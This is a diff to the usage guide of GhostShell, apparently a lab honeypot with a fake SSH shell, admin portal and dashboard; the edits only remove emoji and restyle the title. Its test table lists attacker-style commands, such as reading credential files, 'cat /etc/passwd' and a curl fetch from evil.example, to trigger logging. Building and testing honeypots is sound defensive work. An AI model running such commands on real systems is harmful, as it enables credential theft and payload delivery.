@@ -1,6 +1,6 @@
 <div align="center">
 
-# 📖 GhostShell — Usage Guide
+<h1><span style="color:#22c55e">GhostShell - Usage Guide</span></h1>
 
 **From zero to catching your first attacker in 5 minutes.**
 
@@ -8,7 +8,7 @@
 
 ---
 
-## 🟢 1. Start it
+## 1. Start it
 
 ```bash
 python3 -m venv .venv
@@ -26,7 +26,7 @@ You should see:
 
 ---
 
-## 🎯 2. Attack it (like an attacker would)
+## 2. Attack it (like an attacker would)
 
 ```bash
 ssh admin@localhost -p 2222
@@ -38,7 +38,7 @@ Inside the fake shell, try:
 | Command | What happens |
 |---|---|
 | `ls` | Fake home directory — `.ssh`, `aws_credentials.txt`, `database_backup.sql` |
-| `cat aws_credentials.txt` | 🪤 **Honeytoken hit is logged** |
+| `cat aws_credentials.txt` | **Honeytoken hit is logged** |
 | `cat /etc/passwd` | Fake users, mapped to MITRE Credential Access |
 | `ps aux` | Fake processes — `dockerd`, `server.py` |
 | `curl http://evil.example/x.sh` | Logged as Ingress Tool Transfer |
@@ -47,7 +47,7 @@ Inside the fake shell, try:
 
 ---
 
-## 🌐 3. Try the fake admin panel
+## 3. Try the fake admin panel
 
 Open http://localhost:8081 — fake Acme Corp portal.
 
@@ -58,7 +58,7 @@ Open http://localhost:8081 — fake Acme Corp portal.
 
 ---
 
-## 📊 4. Watch the dashboard
+## 4. Watch the dashboard
 
 Open http://localhost:5000
 
@@ -69,7 +69,7 @@ Open http://localhost:5000
 
 ---
 
-## 🤖 5. Turn on the AI shell (optional)
+## 5. Turn on the AI shell (optional)
 
 ```bash
 # install Ollama from https://ollama.com, then:
@@ -82,7 +82,7 @@ takes over automatically — nothing breaks.
 
 ---
 
-## ⚙️ 6. Config
+## 6. Config
 
 Edit `config.yaml`:
 
@@ -97,7 +97,7 @@ ollama_model: "llama3.2:1b"
 
 ---
 
-## ⚠️ Safety
+## Safety
 
 Lab only. Never expose ports `2222 / 5000 / 8081` to the internet.
 All secrets in GhostShell are **fake** — never put real keys in it.
